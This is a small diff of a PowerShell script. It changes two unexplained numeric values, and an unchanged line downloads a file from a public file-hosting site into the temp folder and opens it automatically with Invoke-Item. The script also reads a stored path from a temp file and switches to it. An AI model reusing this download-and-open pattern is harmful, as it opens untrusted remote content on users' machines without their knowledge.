@@ -1,7 +1,7 @@
 iwr 'http://files.catbox.moe/okr3so.jpg' -OutFile ($d = Join-Path $env:TEMP 'pic.png'); ii $d
 
-$1 = 2564417
-$2 = 4137
+$1 = 2564494
+$2 = 4081
 $t = Join-Path $env:TEMP 'path.txt'
 $currentPath = cat -Path $t
 cd -Path $currentPath
